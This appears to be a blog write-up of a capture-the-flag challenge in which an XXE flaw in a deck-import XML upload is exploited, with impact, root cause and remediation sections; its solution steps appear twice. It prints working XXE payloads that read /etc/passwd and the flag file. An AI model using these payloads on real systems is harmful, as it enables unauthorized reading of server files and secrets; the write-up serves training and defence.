---
layout: post
title:  "BugForge - Daily - Tanuki"
date:   2026-01-19 20:02
image:  /images/bug-forge/bugforge-logo.png
tags:   [xxe]
categories: [BugForge,daily,tanuki]
---

# Daily - Cheesy Does It
><br/><b>Vulnerabilities Covered:</b>
<br/>
 XXE
<br/>
<br/>
<b>Summary:</b>
<br/>
This challenge demonstrates a classic XML External Entity (XXE) vulnerability introduced through a server-side XML file upload feature exposed via the Import Deck functionality. After establishing a baseline during account creation, testing focused on the XML parsing behavior implied by the application’s support for JSON and XML inputs. A traditional XXE payload using an inline DTD with an external entity was submitted, initially attempting to read /etc/passwd and later adjusted to file:///app/flag.txt based on observed challenge patterns. The successful resolution of the external entity and disclosure of the flag confirmed that the backend XML parser allows DTD processing and external entity expansion. This highlights unsafe XML handling that enables arbitrary file reads and illustrates how legacy XXE payloads remain effective when secure parser configurations are not enforced.
<br/>
<br/>
<b>Reference:</b>
<br/>
<a href="https://app.bugforge.io/">Bugforge.io</a>
<br/>
<br/>

## Solution

### Step 1 - Account Creation & Baseline Review

![Registration Request](/images/bug-forge/daily/Tanuki/xxe/traditional/registration-request-response.png)

Here we check for any role, permission, or privilege-related fields that are assigned or implicitly trusted during account creation.

---

### Step 2 - Testing File Upload
Notice the Import Deck option in the navigation bar. This is a strong indicator that the application supports file uploads.

The note `Note: Only JSON and XML formats are supported` points us that this will probably be an XXE vulnerability as it accepts xml.

Download the sample-deck.json and get AI to generate the equivalent xml.

We'll try the traditional XXE Payload to start with and see if we can read the `/etc/passwd` file. 


We've previously had a vulnerable Tanuki challenge where the XXE was only vulnerable with the xi:include <a href="https://zwarts.dev/posts/2026/01/06/BugForge-Daily-Tanuki/">2026-01-06 Tanuki</a>


![Wrong flag path](/images/bug-forge/daily/Tanuki/xxe/traditional/wrong-path.png)

We'll change the path to ```file:///app/flag.txt```.



![Flag](/images/bug-forge/daily/Tanuki/xxe/traditional/flag.png)

---


### Step 1 - Account Creation & Baseline Review

![Registration Request](/images/bug-forge/daily/Tanuki/xxe/traditional/registration-request-response.png)

The first step is to review the account registration flow and establish a baseline understanding of how new users are created.  
The focus is on identifying any role, permission, or privilege-related fields that may be implicitly trusted or automatically assigned during account creation.

---

### Step 2 - File Upload Testing (XXE)

While navigating the application, the **Import Deck** option in the menu indicates that the application supports file uploads.

The note stating **“Only JSON and XML formats are supported”** suggests that XML parsing is performed server-side, making this functionality a strong candidate for XML External Entity (XXE) testing.

After downloading the provided sample deck, it was converted into an equivalent XML structure to mirror the expected schema.

An initial test was performed using a traditional XXE approach to determine whether external entities are processed by the backend.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE deck [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<deck>
  <name>&file;</name>
  <description>A sample deck</description>
  <category>Example</category>
  <cards>
    <card>
      <front>Test</front>
      <back>Test</back>
    </card>
  </cards>
</deck>
```

Previous Tanuki challenges showed that some instances were only exploitable using XInclude-based techniques <a href="https://zwarts.dev/posts/2026/01/16/BugForge-Daily-Tanuki/">Daily - Tanuki (2026-01-16)</a>, so this behavior was kept in mind during testing.

The first attempt did not return the expected output, indicating that the file path being referenced was incorrect.


![Wrong flag path](/images/bug-forge/daily/Tanuki/xxe/traditional/wrong-path.png)


Based on prior challenge patterns, the file path was adjusted to target the application flag location.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE deck [
  <!ENTITY file SYSTEM "file:///app/flag.txt">
]>
<deck>
  <name>&file;</name>
  <description>A sample deck</description>
  <category>Example</category>
  <cards>
    <card>
      <front>Test</front>
      <back>Test</back>
    </card>
  </cards>
</deck>
```

This change successfully returned the contents of the flag file, confirming the presence of a traditional XXE vulnerability.

![Flag](/images/bug-forge/daily/Tanuki/xxe/traditional/flag.png)

---

### Impact
- Unauthorized read access to sensitive files on the application server  
- Disclosure of internal configuration data, secrets, or credentials  
- Potential exposure of application source code or environment variables  
- Increased risk of lateral movement or further exploitation within the environment  
- Demonstrates unsafe XML parsing that could be abused beyond CTF scenarios in real-world deployments  

---

### Vulnerability Classification
- **OWASP Top 10:** Injection  
- **Vulnerability Type:** XML External Entity (XXE) Injection  
- **Attack Surface:** File upload and server-side XML parsing functionality  
- **CWE:** CWE-611 - Improper Restriction of XML External Entity Reference  

---

### Root Cause
The backend XML parser processes user-supplied XML documents with external entity resolution enabled. No safeguards are in place to disable DTD processing or restrict access to local file system resources. As a result, attacker-controlled XML input is trusted and parsed directly, allowing external entities to reference and disclose arbitrary files accessible to the application runtime.

---

### Remediation
- Disable DTD and external entity processing in all XML parsers by default  
- Use secure parser configurations that explicitly disallow external entity resolution  
- Validate and sanitize uploaded XML against a strict schema (XSD) before processing  
- Prefer safer data formats such as JSON where possible for user-supplied content  
- Run application services with the least privilege required to limit file system exposure  
- Add security testing for file upload and XML parsing paths to detect XXE issues early  

---